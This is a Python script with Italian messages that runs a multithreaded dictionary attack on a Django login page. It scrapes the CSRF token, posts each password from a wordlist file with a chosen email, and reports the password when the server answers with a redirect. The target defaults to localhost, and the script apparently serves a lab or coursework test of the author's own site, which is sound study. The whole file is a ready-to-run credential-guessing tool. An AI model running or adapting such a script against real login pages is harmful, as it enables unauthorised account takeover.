import os
import time
import sys
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import threading

TARGET = "http://localhost:8000"
LOGIN_URL = TARGET + "/login/"

EMAIL = input("Email account di test: ")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DIZIONARIO_PATH = os.path.join(BASE_DIR, "dizionario.txt")

lock = threading.Lock()
stop_event = threading.Event()
session = requests.Session()

# Recupero token CSRF una sola volta
def get_csrf_token():
    try:
        r = session.get(LOGIN_URL, timeout=10)
    except requests.exceptions.RequestException:
        print("Errore: impossibile collegarsi al sito.")
        sys.exit(1)

    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrfmiddlewaretoken"})
    if not token:
        print("Errore: token CSRF non trovato.")
        sys.exit(1)
    return token["value"]

csrf_token = get_csrf_token()

tentativi = 0
found = None

# Funzione per provare una password
def try_password(password):
    global tentativi, found
    if stop_event.is_set():
        return

    data = {
        "email": EMAIL,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }

    try:
        r = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=10)
    except requests.exceptions.RequestException:
        return

    with lock:
        tentativi += 1  # incremento solo qui

    time.sleep(0.02)  # pausa minima per non sovraccaricare Django

    if r.status_code == 302:
        with lock:
            if not found:
                found = password
                stop_event.set()

# Controllo dizionario
if not os.path.exists(DIZIONARIO_PATH):
    print(f"File dizionario non trovato: {DIZIONARIO_PATH}")
    sys.exit(1)

# Leggo tutte le password
with open(DIZIONARIO_PATH, "r", encoding="utf-8-sig", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

print("Avvio attacco a dizionario...")
print(f"File dizionario usato: {DIZIONARIO_PATH}")
print("--------------------------------")

start = time.time()

# ThreadPoolExecutor con 3 thread
with ThreadPoolExecutor(max_workers=3) as executor:
    executor.map(try_password, passwords)

end = time.time()
total = end - start

# Stampa solo il risultato finale
if found:
    print("--------------------------------")
    print("ATTACCO RIUSCITO")
    print(f"Email: {EMAIL}")
    print(f"Password trovata: {found}")
    print(f"Tentativi effettuati: {tentativi}")
    print(f"Tempo totale: {total:.2f} secondi")
else:
    print("--------------------------------")
    print("ATTACCO FALLITO")
    print(f"Tentativi effettuati: {tentativi}")
    print("Password non trovata nel dizionario oppure account inesistente.")